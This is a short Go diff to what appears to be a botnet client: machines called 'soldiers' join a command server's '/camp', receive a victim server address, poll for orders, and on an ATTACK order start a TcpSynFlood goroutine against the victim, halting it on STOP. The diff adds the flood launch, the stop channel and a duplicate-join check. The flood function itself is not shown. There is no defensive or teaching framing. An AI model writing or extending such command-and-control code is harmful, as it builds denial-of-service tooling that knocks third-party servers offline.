@@ -3,6 +3,7 @@ package client
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"io"
 	"net/http"
 	"sync"
@@ -90,10 +91,15 @@ func (c *Client) Post(url string, data interface{}, headers string) (interface{}
 func (c *Client) JoinCamp() (interface{}, error) {
 	jc := JsonClient{Name: c.Name}
 	resp, err := c.Post("/camp", jc, "")
+
 	if err != nil {
 		return nil, err
 	}
+	if resp.(string) == "NO" {
+		return nil, fmt.Errorf("Soldier already in camp")
+	}
 	c.VictimServer = resp.(string)
+
 	return resp, nil
 }
 
@@ -111,6 +117,8 @@ func (c *Client) ReceiveOrder() (interface{}, error) {
 
 func (c *Client) ListenToOrders() {
 	var pervOder string
+	stop := make(chan bool, 1)
+
 	for {
 		order, err := c.ReceiveOrder()
 		if err != nil {
@@ -120,12 +128,15 @@ func (c *Client) ListenToOrders() {
 			continue
 		}
 		if order == ATTACK {
+			go TcpSynFlood(c.VictimServer, stop)
 		}
 		if order == STOP {
+			stop <- true
 		}
 		if order == NOTHING {
 
 		}
+		pervOder = order.(string)
 		time.Sleep(2 * time.Second)
 	}
 }
